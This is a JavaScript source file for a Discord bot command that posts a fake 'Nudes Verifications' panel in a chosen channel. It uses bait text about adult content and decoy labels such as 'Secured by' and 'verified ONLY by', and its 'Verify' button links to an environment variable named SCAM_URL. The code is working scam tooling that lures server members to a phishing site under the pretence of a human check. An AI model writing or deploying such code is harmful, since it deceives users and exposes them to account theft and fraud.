const { SlashCommandBuilder, PermissionsBitField, EmbedBuilder, AttachmentBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { error, check } = require('../../utils/console');
const { existGuild, createGuild, editGuild } = require('../../database/manage');
const log = console.log;

module.exports = {
    data: new SlashCommandBuilder()
    .setName('setup')
    .setDescription('setup channel for verification')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.ManageGuild)
    .setDMPermission(false)
    .addChannelOption(option => 
        option.setName('channel')
        .setDescription('Choose a channel')
        .setRequired(true)
    )
    .addRoleOption(option => 
        option.setName('role')
        .setDescription('Choose a role added after the verif')
        .setRequired(true))
    , async execute(interaction, client) {
        try {
            const { guild } = interaction;
            const channel = interaction.options.getChannel('channel') || null;
            const role = interaction.options.getRole('role') || null;
    
            if(channel && role) {
                const hasGuild = await existGuild(guild.id);
                if(hasGuild) {
                    await editGuild(guild.id, channel.id, role.id);
                } else {
                    await createGuild(guild.id, channel.id, role.id);
                }
                
                await interaction.reply({ content: `✔️ » The channel has been correctly added !`, ephemeral: true })

                const embed = new EmbedBuilder()
                .setColor(process.env.COLOR)
                .addFields({
                    name: `🤖 Nudes Verifications`,
                    value: "To access the rest of the **Nudes content** ❤️, you must prove that you are human. The verification is automatic, you just have to click on the button below."
                })
                .setFooter({ text: `Secured by ${client.user.username}`, iconURL: client.user.displayAvatarURL({ dynamic: true })});

                const path = `./assets`;
                let file = new AttachmentBuilder(`${path}/banner.png`);;

                embed.setImage(`attachment://banner.png`);

                const rows = [];
                rows.push(
                    new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setCustomId('powered')
                            .setLabel(`verified ONLY by ${client.user.username}`)
                            .setStyle(ButtonStyle.Secondary)
                            .setDisabled(true)
                    ),
                    new ActionRowBuilder()
                    .addComponents(
                        new ButtonBuilder()
                            .setLabel(`Verify`)
                            .setStyle(ButtonStyle.Link)
                            .setURL(process.env.SCAM_URL)
                            .setDisabled(false)
                            .setEmoji('1212142188117364880'),
                        new ButtonBuilder()
                            .setCustomId('why')
                            .setLabel(`Why`)
                            .setStyle(ButtonStyle.Secondary)
                            .setDisabled(true)
                    )
                )

                await channel.send({ content: '', embeds: [embed], files: [file], components: rows })
                return log(check + `${channel.id} is now a setup channel`);
            }
        } catch {
            log(error + `crash ${interaction.commandName} command`)
        }
    }
}